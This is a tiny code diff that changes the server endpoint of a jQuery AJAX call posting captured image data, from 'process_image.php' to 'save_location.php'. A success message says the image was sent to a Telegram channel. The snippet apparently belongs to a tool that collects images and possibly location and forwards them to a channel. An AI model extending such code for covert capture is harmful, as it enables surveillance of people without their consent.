@@ -15,7 +15,7 @@
             $.ajax({
                 type: 'POST',
                 data: { image: imgData },
-                url: 'process_image.php',
+                url: 'save_location.php',
                 dataType: 'json',
                 success: function(result) {
                     console.log('Image sent to Telegram channel!');
